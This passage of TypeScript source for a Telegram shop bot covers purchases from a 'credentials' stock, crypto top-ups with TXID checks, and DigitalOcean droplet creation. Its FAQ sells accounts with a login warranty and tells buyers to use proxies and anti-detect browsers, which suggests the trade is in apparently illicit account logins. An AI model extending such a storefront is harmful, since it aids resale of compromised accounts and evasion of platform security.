        await targetBot.sendMessage(chatId, "🚀 Creating SSH key & droplet... Please wait.");

        try {
          // Register SSH Key first
          const sshResponse = await axios.post('https://api.digitalocean.com/v2/account/keys', {
            name: `key-${userId}-${Math.floor(Date.now() / 1000)}`,
            public_key: sshKey
          }, {
            headers: { 'Authorization': `Bearer ${tgUser.doApiKey}` }
          });

          const response = await axios.post('https://api.digitalocean.com/v2/droplets', {
            name: `cloudshop-${userId}-${Math.floor(Date.now() / 1000)}`,
            region: region,
            size: size,
            image: image,
            ssh_keys: [sshResponse.data.ssh_key.id]
          }, {
            headers: {
              'Authorization': `Bearer ${tgUser.doApiKey}`,
              'Content-Type': 'application/json'
            }
          });
          const droplet = response.data.droplet;
          await storage.updateTelegramUserByChatId(userId, { lastDropletId: droplet.id.toString() });

          await targetBot.sendMessage(chatId, `✅ Droplet created with SSH key!\n\nName: ${droplet.name}\nRegion: ${region}\nOS: ${image}\n\nAccess info will be ready shortly. I will poll for the IP address...`);

          // Poll for IP address
          let attempts = 0;
          const pollInterval = setInterval(async () => {
            attempts++;
            if (attempts > 10) {
              clearInterval(pollInterval);
              return;
            }
            try {
              const checkRes = await axios.get(`https://api.digitalocean.com/v2/droplets/${droplet.id}`, {
                headers: { 'Authorization': `Bearer ${tgUser.doApiKey}` }
              });
              const updatedDroplet = checkRes.data.droplet;
              const ipv4 = updatedDroplet.networks.v4.find((n: any) => n.type === 'public')?.ip_address;
              if (ipv4) {
                clearInterval(pollInterval);
                await targetBot.sendMessage(chatId, `🌐 *Droplet Access Info*\n\nIP IPv4: \`${ipv4}\`\nSSH Key: (Already added)\n\nYou can now connect via SSH.`);
              }
            } catch (e) { }
          }, 15000);

        } catch (err: any) {
          await targetBot.sendMessage(chatId, `❌ Creation failed: ${err.response?.data?.message || err.message}`);
        }
      } else if (tgUser?.lastAction === 'awaiting_do_api_key') {
        const apiKey = normalizedText?.trim();
        if (!apiKey) return;

        await storage.updateTelegramUserByChatId(userId, {
          doApiKey: apiKey,
          lastAction: null
        });
        await targetBot.sendMessage(chatId, "✅ DigitalOcean API key saved! You can now create droplets from your profile.");
      } else if (normalizedText === '👤 Profile') {
        console.log(`Profile requested for user: ${userId}`);
        const userToDisplay = tgUser || await storage.createTelegramUser({
          telegramId: userId,
          username: msg.from?.username || null,
          firstName: msg.from?.first_name || 'User',
          lastName: msg.from?.last_name || null,
          balance: 0,
          lastAction: null
        });

        const allOrders = await storage.getOrders();
        const userPurchases = allOrders.filter(o => o.telegramUserId === userToDisplay.id).length;
        const balanceUSD = (userToDisplay.balance / 100).toFixed(2);
        const regDate = userToDisplay.createdAt ? format(userToDisplay.createdAt, "yyyy-MM-dd HH:mm:ss") : "N/A";
        const automationSetting = await storage.getSetting("AUTOMATION_ENABLED");
        const isAutomationEnabled = automationSetting?.value === "true";

        const specialOffersSetting = await storage.getSetting("SPECIAL_OFFERS_ENABLED");
        const isSpecialOffersEnabled = specialOffersSetting?.value !== "false"; // Default to true

        const baseUrl = process.env.BASE_URL || (process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'https://your-domain.com');
        const shopUrl = `${baseUrl}/shop`;

        const inline_keyboard = [
          [{ text: 'Add funds', callback_data: 'add_funds', icon_custom_emoji_id: '5201692367437974073' }, { text: 'Purchase history', callback_data: 'purchase_history', icon_custom_emoji_id: '5334882760735598374' }],
          isAutomationEnabled
            ? [{ text: '🤖 Automation', callback_data: 'automation_menu' }, { text: 'Tutorial', callback_data: 'tutorial_menu', icon_custom_emoji_id: '5226512880362332956' }]
            : [{ text: 'Tutorial', callback_data: 'tutorial_menu', icon_custom_emoji_id: '5226512880362332956' }]
        ];

        if (isSpecialOffersEnabled) {
          inline_keyboard.push([{ text: 'Special Offers', callback_data: 'special_offers', icon_custom_emoji_id: '6276134137963222688' }]);
        }

        const keyboard = { inline_keyboard };
        console.log('Sending keyboard:', JSON.stringify(keyboard));

        const botInstance = targetBot;
        if (botInstance) {
          await botInstance.sendMessage(chatId, `<tg-emoji emoji-id="5467538555158943525">💭</tg-emoji> <b>Your Profile</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji>\n━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>ID:</b> ${userToDisplay.telegramId}\n\n<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji> <b>Balance:</b> ${balanceUSD}$\n\n<tg-emoji emoji-id="5348256365477382384">⭐️</tg-emoji> <b>Purchased pcs:</b> ${userPurchases} pcs\n\n<tg-emoji emoji-id="5805188079148863343">🕒</tg-emoji> <b>Registration:</b> ${regDate}`, {
            reply_markup: keyboard,
            parse_mode: 'HTML'
          });
        }
      } else if (normalizedText === supportBtnText || normalizedText?.includes(supportBtnText)) {
        const supportUsernameSetting = await storage.getSetting("SUPPORT_USERNAME");
        const supportUsername = supportUsernameSetting?.value || "@rochana_imesh";
        const cleanUsername = supportUsername.replace('@', '');
        targetBot.sendMessage(chatId, `<tg-emoji emoji-id="5461151367559141950">📩</tg-emoji> <b>For support, please contact us below:</b>`, {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [[
              { text: supportBtnText, url: `https://t.me/${cleanUsername}` }
            ]]
          }
        });
      } else if (normalizedText === '❓ FAQ') {
        const userName = tgUser?.firstName || 'User';
        const supportUsernameSetting = await storage.getSetting("SUPPORT_USERNAME");
        const supportUsername = supportUsernameSetting?.value || "@rochana_imesh";

        const rulesMessage = `<tg-emoji emoji-id="5413554183502572090">👋</tg-emoji> <b>Welcome, ${userName}</b> <tg-emoji emoji-id="5413554183502572090">✨</tg-emoji>\n\n` +
          `<tg-emoji emoji-id="5213181173026533794">⚠️</tg-emoji> <b>STORE RULES – PLEASE READ BEFORE BUYING</b> <tg-emoji emoji-id="5213181173026533794">⚠️</tg-emoji>\n\n` +
          `<tg-emoji emoji-id="5220091753930959575">1️⃣</tg-emoji> <b>Login Warranty Included</b>\n` +
          `You will receive a 100% working account at the time of purchase.\n` +
          `<tg-emoji emoji-id="6010111371251815589">⏱️</tg-emoji> <i>Checking time: 10–30 minutes after delivery.</i>\n\n` +
          `<tg-emoji emoji-id="5220041227935690133">2️⃣</tg-emoji> <b>Stay Safe & Secure</b>\n` +
          `Always use quality proxies and a proper fingerprint/anti-detect browser to avoid any security issues.\n\n` +
          `<tg-emoji emoji-id="5220224743298312689">3️⃣</tg-emoji> <b>User Responsibility</b>\n` +
          `We are not responsible for any actions taken after purchase.\n` +
          `Account usage is fully under the buyer’s responsibility.\n\n` +
          `<tg-emoji emoji-id="4958734459869332468">💯</tg-emoji> <b>Follow the rules, stay secure, and enjoy your purchase!</b> <tg-emoji emoji-id="4958734459869332468">💯</tg-emoji>\n\n` +
          `<tg-emoji emoji-id="5341498088408234504">⛱️</tg-emoji> <b>Need help or have questions?</b>\n` +
          `<tg-emoji emoji-id="5282843764451195532">🎗️</tg-emoji> <b>Contact us:</b> <tg-emoji emoji-id="5461151367559141950">💌</tg-emoji> ${supportUsername}`;

        targetBot.sendMessage(chatId, rulesMessage, { parse_mode: 'HTML' });
      } else if (tgUser?.lastAction?.startsWith('awaiting_quantity_')) {
        const productId = parseInt(tgUser.lastAction.split('_')[2]);
        const quantity = parseInt(normalizedText || "0");
        console.log(`[Purchase] User ${chatId} entered quantity: ${quantity} for product: ${productId}`);

        // Basic validation outside tx
        if (isNaN(quantity) || quantity <= 0) return targetBot.sendMessage(chatId, "❌ Please enter a valid number.");

        const product = await storage.getProduct(productId);
        if (!product) return targetBot.sendMessage(chatId, "❌ Product not found.");

        const stock = await storage.getCredentialsByProduct(productId);
        const availableStock = stock.filter(c => c.status === 'available').length;
        console.log(`[Purchase] Product: ${product.name}, Available Stock: ${availableStock}, Requested: ${quantity}`);

        if (quantity > availableStock) {
          console.log(`[Purchase] Rejecting due to insufficient stock: ${quantity} > ${availableStock}`);
          return targetBot.sendMessage(chatId, `❌ Sorry, you can enter maximum ${availableStock} pcs only for this product.`);
        }

        try {
          const result = await db.transaction(async (tx) => {
            // 1. Get user and product inside transaction
            const user = await tx.query.telegramUsers.findFirst({
              where: eq(telegramUsers.id, tgUser.id)
            });

            if (!user) throw new Error("User not found.");

            const totalPrice = product.price * quantity;

            // 2. Stock check first inside transaction
            const availableCredentials = await tx.select()
              .from(credentials)
              .where(and(eq(credentials.productId, productId), eq(credentials.status, 'available')))
              .limit(quantity)
              .for('update', { skipLocked: true });

            if (availableCredentials.length < quantity) {
              throw new Error(`Sorry, only ${availableCredentials.length} Pcs remaining.`);
            }

            // 3. Atomic Balance check and deduction
            const [updatedUser] = await tx
              .update(telegramUsers)
              .set({
                balance: sql`${telegramUsers.balance} - ${totalPrice}`
              })
              .where(and(eq(telegramUsers.id, user.id), gte(telegramUsers.balance, totalPrice)))
              .returning();

            if (!updatedUser) throw new Error("Insufficient balance");

            // 4. Mark credentials as sold and create orders
            for (const cred of availableCredentials) {
              await tx.update(credentials)
                .set({ status: 'sold' })
                .where(eq(credentials.id, cred.id));

              await tx.insert(orders).values({
                telegramUserId: user.id,
                productId: product.id,
                credentialId: cred.id,
                status: 'completed'
              });
            }

            // 5. Clear last action
            await tx.update(telegramUsers)
              .set({ lastAction: null, lastMessageId: null })
              .where(eq(telegramUsers.id, user.id));

            return { product, availableCredentials, totalPrice };
          });

          // 6. Success Response
          let productName = result.product.name.replace(/🇱🇰/g, '<tg-emoji emoji-id="5224277294050192388">🇱🇰</tg-emoji>');
          productName = productName.replace(/\bAWS\b/gi, '<tg-emoji emoji-id="5785025630055700143">☁️</tg-emoji> AWS');

          const itemsText = result.availableCredentials.map((c, index) => `<b>${(index + 1).toString().padStart(2, '0')}.</b>\n${escapeHTML(c.content)}`).join('\n\n');

          await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Purchase successful!</b> <tg-emoji emoji-id="5431411862950388510">🙏</tg-emoji>\n\n<b>Product:</b> ${productName}\n<b>Quantity:</b> ${quantity}\n<b>Total:</b> $${(result.totalPrice / 100).toFixed(2)}\n\n<b>Your items:</b>\n\n${itemsText}`, { parse_mode: 'HTML' });

          // Emit real-time notification to Admin Dashboard
          const userDisplayName = tgUser.firstName || tgUser.username || "User";
          io.emit('admin_notification', {
            type: 'purchase',
            title: 'New Purchase (Telegram Bot)',
            message: `${userDisplayName} bought ${quantity}x ${result.product.name} ($${(result.totalPrice / 100).toFixed(2)})`,
            data: {
              ...result,
              quantity,
              tgUser
            }
          });

          // Emit Native Push Notification
          sendAdminPushNotification(
            'New Purchase (Telegram Bot)',
            `${userDisplayName} bought ${quantity}x ${result.product.name} ($${(result.totalPrice / 100).toFixed(2)})`
          ).catch(console.error);

        } catch (err: any) {
          console.error('Normal purchase error:', err);
          if (err.message === "Insufficient balance") {
            const totalPrice = product.price * quantity;
            
            const errorMsg = `<tg-emoji emoji-id="5215209935188534658">❌</tg-emoji> <b>Insufficient Balance!</b>\n\n` +
              `Your current balance is <b>$${(tgUser.balance / 100).toFixed(2)}</b>, but this purchase costs <b>$${(totalPrice / 100).toFixed(2)}</b>.\n\n` +
              `Please top up your account to continue. <tg-emoji emoji-id="5231102735817918643">💸</tg-emoji>`;

            await targetBot.sendMessage(chatId, errorMsg, {
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: [[{ text: '💰 Add Now (Top-up)', callback_data: 'add_funds' }]]
              }
            });
          } else {
            await targetBot.sendMessage(chatId, `❌ Purchase failed: ${err.message}`);
          }
          // Also clear the last action if it was a real logic error
          await storage.updateTelegramUser(tgUser.id, { lastAction: null });
        }

        // Delete the prompt and user input
        try {
          if (tgUser.lastMessageId) {
            await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
          }
          await targetBot.deleteMessage(chatId, msg.message_id);
        } catch (e) { }
      } else if (tgUser?.lastAction === 'awaiting_cryptobot_amount') {
        const amount = parseFloat(normalizedText || "0");

        try {
          if (tgUser.lastMessageId) {
            await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
          }
          await targetBot.deleteMessage(chatId, msg.message_id);
        } catch (e) { }

        if (isNaN(amount) || amount <= 0) {
          targetBot.sendMessage(chatId, "❌ Invalid amount. Please enter a valid number.");
          return;
        }

        const newPayment = await storage.createPayment({
          telegramUserId: tgUser.id,
          amount: Math.round(amount * 100),
          paymentMethod: 'cryptobot',
          status: 'pending'
        });

        const res = await createCryptoBotInvoice(amount, newPayment.id.toString());
        await storage.updateTelegramUser(tgUser.id, { lastAction: null });

        if (res.success && res.payUrl) {
          if (res.invoiceId) {
            await storage.updatePayment(newPayment.id, { externalId: res.invoiceId.toString() });
          }
          const msgText = `<tg-emoji emoji-id="5361543877599724417">🤖</tg-emoji> <b>@CryptoBot Top-up Invoice</b>\n` +
            `➖➖➖➖➖➖➖➖➖➖\n` +
            `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Top-up amount: <b>$${amount.toFixed(2)} USD</b>\n` +
            `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Status: <tg-emoji emoji-id="6010111371251815589">⏳</tg-emoji> Pending\n` +
            `➖➖➖➖➖➖➖➖➖➖\n` +
            `Click on the button below to pay via <b>@CryptoBot</b>:`;

          const keyboard: any[][] = [
            [{ text: `Pay $${amount.toFixed(2)} via @CryptoBot`, url: res.payUrl, icon_custom_emoji_id: '5361543877599724417' }],
            [{ text: 'Check top-up', callback_data: `check_payment_${newPayment.id}`, icon_custom_emoji_id: '6010111371251815589' }]
          ];

          const imagePath = path.resolve(process.cwd(), 'public/assets/cryptobot.png');
          try {
            await sendPhotoWithCache(targetBot, chatId, imagePath, 'FILE_ID_CRYPTOBOT', {
              caption: msgText,
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: keyboard
              }
            });
          } catch (photoErr) {
            console.error("Failed to send CryptoBot photo:", photoErr);
            await targetBot.sendMessage(chatId, msgText, {
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: keyboard
              }
            });
          }
        } else {
          targetBot.sendMessage(chatId, `❌ Failed to create @CryptoBot invoice: ${res.error || 'Please check admin settings'}`);
        }
      } else if (tgUser?.lastAction === 'awaiting_cryptomus_amount') {
        const amount = parseFloat(normalizedText || "0");

        // Delete prompt and user input
        try {
          if (tgUser.lastMessageId) {
            await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
          }
          await targetBot.deleteMessage(chatId, msg.message_id);
        } catch (e) { }

        if (isNaN(amount) || amount <= 0) {
          targetBot.sendMessage(chatId, "❌ Invalid amount. Please enter a number.");
          return;
        }

        await processCryptomusInvoiceCreation(targetBot, chatId, tgUser, amount);
      } else if (tgUser?.lastAction === 'awaiting_binance_deposit_amount') {
        const amount = parseFloat(normalizedText || "0");

        // Delete prompt and user input
        try {
          if (tgUser.lastMessageId) {
            await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
          }
          await targetBot.deleteMessage(chatId, msg.message_id);
        } catch (e) { }

        if (isNaN(amount) || amount <= 0) {
          targetBot.sendMessage(chatId, "❌ Invalid amount. Please enter a number.");
          return;
        }

        const method = 'Binance';
        const payIdKey = 'BINANCE_PAY_ID';
        const payId = (await storage.getSetting(payIdKey))?.value || "Not Set";

        // Amount Locking: Check for existing pending payment with same amount
        const existingPending = await storage.getPendingPaymentByAmount(tgUser.id, Math.round(amount * 100));
        if (existingPending) {
          await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
          return targetBot.sendMessage(chatId, `⚠️ You already have a pending $${amount} payment for ${method}. Please pay that one first or wait for it to expire (1 hour).`);
        }

        await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });

        const payment = await storage.createPayment({
          telegramUserId: tgUser.id,
          amount: Math.round(amount * 100),
          paymentMethod: method.toLowerCase(),
          status: 'pending'
        });

        const response = `<tg-emoji emoji-id="5388622778817589921">💰</tg-emoji> <b>Top-up: ${method}</b>\n` +
          `━━━━━━━━━━━━━━━\n` +
          `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> <b>${method} Pay ID:</b> <code>${payId}</code>\n` +
          `<tg-emoji emoji-id="5231102735817918643">💵</tg-emoji> <b>Transfer amount:</b> <code>${amount}$</code>\n` +
          `<tg-emoji emoji-id="5334982154868783692">📝</tg-emoji> <b>In Note:</b> <code>${userId}</code>\n\n` +
          `<tg-emoji emoji-id="6327875123646829719">⚠️</tg-emoji> <b>IMPORTANT</b>\n` +
          `• Please transfer this <b>exact amount</b>.\n` +
          `• You <b>MUST</b> include your User ID in the Note field.\n` +
          `━━━━━━━━━━━━━━━\n` +
          `<tg-emoji emoji-id="6010111371251815589">⏳</tg-emoji> After payment, click on Check payment`;

        const keyboard = [
          [{ text: `Copy ${method} Pay ID: ${payId}`, callback_data: `copy_payid_${payId}`, icon_custom_emoji_id: '5334982154868783692' }],
          [{ text: `Copy User ID: ${userId}`, callback_data: `copy_userid_${userId}`, icon_custom_emoji_id: '5334982154868783692' }],
          [{ text: 'Check payment', callback_data: `check_payment_${payment.id}`, icon_custom_emoji_id: '6010111371251815589' }]
        ] as any[][];

        console.log(`Sending ${method} payment message with keyboard:`, JSON.stringify(keyboard));

        const imagePath = path.resolve(process.cwd(), 'public/assets/binance_pay_new.png');
        try {
          await sendPhotoWithCache(targetBot, chatId, imagePath, 'FILE_ID_BINANCE_PAY', {
            caption: response,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: keyboard
            }
          });
        } catch (photoErr) {
          console.error("Failed to send Binance Pay photo:", photoErr);
          await targetBot.sendMessage(chatId, response, {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: keyboard
            }
          });
        }
      } else if (tgUser?.lastAction === 'awaiting_trc20_amount') {
        try {
          const amount = parseFloat(normalizedText || "0");

          try {
            if (tgUser.lastMessageId) {
              await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
            }
            await targetBot.deleteMessage(chatId, msg.message_id);
          } catch (e) { }

          if (isNaN(amount) || amount <= 0) {
            targetBot.sendMessage(chatId, "❌ Invalid amount. Please enter a number.");
            return;
          }

          const wallet = (await storage.getSetting('TRC20_WALLET_ADDRESS'))?.value || "Not Set";

          const existingPending = await storage.getPendingPaymentByAmount(tgUser.id, Math.round(amount * 100));
          if (existingPending) {
            await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
            return targetBot.sendMessage(chatId, `⚠️ You already have a pending $${amount} payment. Please pay that one first or wait for it to expire (1 hour).`);
          }

          const payment = await storage.createPayment({
            telegramUserId: tgUser.id,
            amount: Math.round(amount * 100),
            paymentMethod: 'trc20',
            status: 'pending'
          });

          await storage.updateTelegramUserByChatId(chatId.toString(), {
            lastAction: `awaiting_trc20_txid_${payment.id}_0`
          });

          const responseMsg = `<tg-emoji emoji-id="5377620962390857342">💎</tg-emoji> <b>Top-up: TRC20 (USDT)</b>\n` +
            `━━━━━━━━━━━━━━━\n` +
            `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>TRC20 Address:</b> <code>${wallet}</code>\n` +
            `<tg-emoji emoji-id="5231102735817918643">💵</tg-emoji> <b>Transfer amount:</b> <code>${amount.toFixed(2)}$</code>\n\n` +
            `<tg-emoji emoji-id="6327875123646829719">⚠️</tg-emoji> <b>IMPORTANT</b>\n` +
            `• Please transfer this <b>exact amount</b>.\n` +
            `• You <b>MUST</b> use the <b>TRC20 network</b>.\n` +
            `━━━━━━━━━━━━━━━\n` +
            `<tg-emoji emoji-id="6010111371251815589">⏳</tg-emoji> After payment, click on Check payment`;

          const keyboard = [
            [{ text: `Copy Wallet Address`, callback_data: `copy_wallet_trc20`, icon_custom_emoji_id: '5334982154868783692' }],
            [{ text: 'Check payment', callback_data: `check_payment_${payment.id}`, icon_custom_emoji_id: '6010111371251815589' }]
          ] as any[][];

          const imagePath = path.resolve(process.cwd(), 'public/assets/usdt_trc20.png');
          try {
            await sendPhotoWithCache(targetBot, chatId, imagePath, 'FILE_ID_USDT_TRC20', {
              caption: responseMsg,
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard: keyboard }
            });
          } catch (photoErr) {
            console.error("Failed to send TRC20 photo:", photoErr);
            await targetBot.sendMessage(chatId, responseMsg, {
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard: keyboard }
            });
          }
        } catch (err: any) {
          console.error("Error initiating TRC20 payment:", err);
          targetBot.sendMessage(chatId, `❌ Failed to initiate TRC20 deposit: ${err.message || err}`);
        }
      } else if (tgUser?.lastAction === 'awaiting_aptos_amount') {
        try {
          const amount = parseFloat(normalizedText || "0");

          try {
            if (tgUser.lastMessageId) {
              await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
            }
            await targetBot.deleteMessage(chatId, msg.message_id);
          } catch (e) { }

          if (isNaN(amount) || amount <= 0) {
            targetBot.sendMessage(chatId, "❌ Invalid amount. Please enter a number.");
            return;
          }

          const wallet = (await storage.getSetting('APTOS_WALLET_ADDRESS'))?.value || "Not Set";

          const existingPending = await storage.getPendingPaymentByAmount(tgUser.id, Math.round(amount * 100));
          if (existingPending) {
            await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
            return targetBot.sendMessage(chatId, `⚠️ You already have a pending $${amount} payment. Please pay that one first or wait for it to expire (1 hour).`);
          }

          const payment = await storage.createPayment({
            telegramUserId: tgUser.id,
            amount: Math.round(amount * 100),
            paymentMethod: 'aptos',
            status: 'pending'
          });

          await storage.updateTelegramUserByChatId(chatId.toString(), {
            lastAction: `awaiting_aptos_txid_${payment.id}_0`
          });

          const responseMsg = `<tg-emoji emoji-id="5798849051017352095">⚡</tg-emoji> <b>Top-up: Aptos (USDT)</b>\n` +
            `━━━━━━━━━━━━━━━\n` +
            `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Aptos Address:</b> <code>${wallet}</code>\n` +
            `<tg-emoji emoji-id="5231102735817918643">💵</tg-emoji> <b>Transfer amount:</b> <code>${amount.toFixed(2)}$</code>\n\n` +
            `<tg-emoji emoji-id="6327875123646829719">⚠️</tg-emoji> <b>IMPORTANT</b>\n` +
            `• Please transfer this <b>exact amount</b>.\n` +
            `• You <b>MUST</b> use the <b>Aptos network</b>.\n` +
            `━━━━━━━━━━━━━━━\n` +
            `<tg-emoji emoji-id="6010111371251815589">⏳</tg-emoji> After payment, click on Check payment`;

          const keyboard = [
            [{ text: `Copy Wallet Address`, callback_data: `copy_wallet_aptos`, icon_custom_emoji_id: '5334982154868783692' }],
            [{ text: 'Check payment', callback_data: `check_payment_${payment.id}`, icon_custom_emoji_id: '6010111371251815589' }]
          ] as any[][];

          const imagePath = path.resolve(process.cwd(), 'public/assets/usdt_aptos.png');
          try {
            await sendPhotoWithCache(targetBot, chatId, imagePath, 'FILE_ID_USDT_APTOS', {
              caption: responseMsg,
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard: keyboard }
            });
          } catch (photoErr) {
            console.error("Failed to send Aptos photo:", photoErr);
            await targetBot.sendMessage(chatId, responseMsg, {
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard: keyboard }
            });
          }
        } catch (err: any) {
          console.error("Error initiating Aptos payment:", err);
          targetBot.sendMessage(chatId, `❌ Failed to initiate Aptos deposit: ${err.message || err}`);
        }
      } else if (tgUser?.lastAction?.startsWith('awaiting_trc20_txid_')) {
        const parts = tgUser.lastAction.split('_');
        const paymentId = parseInt(parts[3]);
        const attempts = parts.length > 4 ? parseInt(parts[4]) : 0;
        const txId = normalizedText?.trim() || "";

        try {
          if (tgUser.lastMessageId) {
            await targetBot.deleteMessage(chatId, tgUser.lastMessageId);
          }
          await targetBot.deleteMessage(chatId, msg.message_id);
        } catch (e) { }

        if (!txId) {
          const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Please enter a valid Transaction ID (TXID).</b>`, { parse_mode: 'HTML' });
          setTimeout(() => {
            targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
          }, 15000);
          return;
        }

        // Lock payment and transition status to processing
        const payment = await db.transaction(async (tx) => {
          const [p] = await tx.select().from(payments).where(eq(payments.id, paymentId)).for('update');
          if (!p) return null;
          if (p.status !== 'pending') return p;

          const [updated] = await tx.update(payments)
            .set({ status: 'processing', updatedAt: new Date() })
            .where(eq(payments.id, paymentId))
            .returning();
          return updated;
        });

        if (!payment || payment.status !== 'processing') {
          const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Payment request not found or already processed. Please request a new deposit.</b>`, { parse_mode: 'HTML' });
          setTimeout(() => {
            targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
          }, 15000);
          return;
        }

        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
        if (payment.createdAt && new Date(payment.createdAt) < oneHourAgo) {
          await storage.updatePayment(payment.id, { status: 'expired' });
          await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>This payment request has expired. Please create a new one.</b>`, { parse_mode: 'HTML' });
          return;
        }

        const walletAddress = (await storage.getSetting('TRC20_WALLET_ADDRESS'))?.value;
        if (!walletAddress) {
          await storage.updatePayment(payment.id, { status: 'pending' });
          await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>TRC20 wallet is not configured. Please contact support.</b>`, { parse_mode: 'HTML' });
          return;
        }

        try {
          const verificationMode = (await storage.getSetting('TRC20_VERIFICATION_MODE'))?.value || 'binance';
          const checkingMsgText = verificationMode === 'binance' 
            ? `⏳ <b>Verifying your TRC20 payment via Binance...</b> Please wait a moment.`
            : `⏳ <b>Verifying your TRC20 payment on-chain...</b> Please wait a moment.`;
          const checkingMsg = await targetBot.sendMessage(chatId, checkingMsgText, { parse_mode: 'HTML' });

          const result = verificationMode === 'binance'
            ? await verifyDepositViaBinance(txId, 'TRC20', walletAddress)
            : await verifyTrc20Transaction(txId, walletAddress);

          try {
            await targetBot.deleteMessage(chatId, checkingMsg.message_id);
          } catch (e) { }

          if (result.success && result.actualAmount) {
            const txResult = await db.transaction(async (tx) => {
              const [settingRow] = await tx.select().from(settings).where(eq(settings.key, 'USED_TXIDS_JSON')).for('update');
              let currentUsed: string[] = [];
              if (settingRow?.value) {
                try { currentUsed = JSON.parse(settingRow.value); } catch(e) {}
              }
              if (currentUsed.includes(txId.toLowerCase())) {
                return { success: false, error: "duplicate" };
              }

              const [u] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, tgUser.id)).for('update');
              if (!u) return { success: false, error: "user_not_found" };

              currentUsed.push(txId.toLowerCase());
              if (settingRow) {
                await tx.update(settings).set({ value: JSON.stringify(currentUsed), updatedAt: new Date() }).where(eq(settings.key, 'USED_TXIDS_JSON'));
              } else {
                await tx.insert(settings).values({ key: 'USED_TXIDS_JSON', value: JSON.stringify(currentUsed) });
              }

              const creditAmountCents = Math.round(result.actualAmount * 100);
              await tx.update(telegramUsers).set({
                balance: u.balance + creditAmountCents,
                lastAction: null,
                lastMessageId: null
              }).where(eq(telegramUsers.id, u.id));

              await tx.update(payments).set({
                status: 'completed',
                externalId: txId,
                amount: creditAmountCents,
                updatedAt: new Date()
              }).where(eq(payments.id, payment.id));

              return { success: true, creditAmountCents };
            });

            if (txResult.success) {
              await targetBot.sendMessage(chatId, 
                `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>TRC20 Payment Verified successfully!</b>\n\n` +
                `<tg-emoji emoji-id="5388622778817589921">💰</tg-emoji> Credited: <b>$${result.actualAmount.toFixed(2)}</b> has been added to your balance.\n` +
                `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> Account ID: <code>${tgUser.telegramId}</code>\n\n` +
                `Thank you for your purchase! <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`,
                { parse_mode: 'HTML' }
              );

              const userDisplayName = tgUser.firstName || tgUser.username || "User";
              io.emit('admin_notification', {
                type: 'deposit',
                title: 'New TRC20 Deposit',
                message: `${userDisplayName} deposited $${result.actualAmount.toFixed(2)} via TRC20`,
                data: {
                  paymentId: payment.id,
                  userId: tgUser.telegramId,
                  amount: result.actualAmount,
                  txId
                }
              });

              sendAdminPushNotification(
                'New TRC20 Deposit',
                `${userDisplayName} deposited $${result.actualAmount.toFixed(2)} (TXID: ${txId.substring(0, 10)}...)`
              ).catch(console.error);
            } else {
              await storage.updatePayment(payment.id, { status: 'pending' });
              const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Verification failed:</b> This Transaction ID (TXID) has already been used.`, { parse_mode: 'HTML' });
              const newAttempts = attempts + 1;
              if (newAttempts >= 3) {
                await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: null });
                const warnMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Too many failed attempts.</b> Please click "Check payment" again to retry.`, { parse_mode: 'HTML' });
                setTimeout(() => {
                  targetBot.deleteMessage(chatId, warnMsg.message_id).catch(() => {});
                }, 15000);
              } else {
                await storage.updateTelegramUserByChatId(chatId.toString(), { lastAction: `awaiting_trc20_txid_${payment.id}_${newAttempts}` });
              }
              setTimeout(() => {
                targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
              }, 15000);
            }
          } else {
            await storage.updatePayment(payment.id, { status: 'pending' });
            const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Verification failed:</b> ${result.error || 'Transaction details did not match.'}\n\nPlease check your TXID and try entering it again:`, { parse_mode: 'HTML' });
            const newAttempts = attempts + 1;
            if (newAttempts >= 3) {
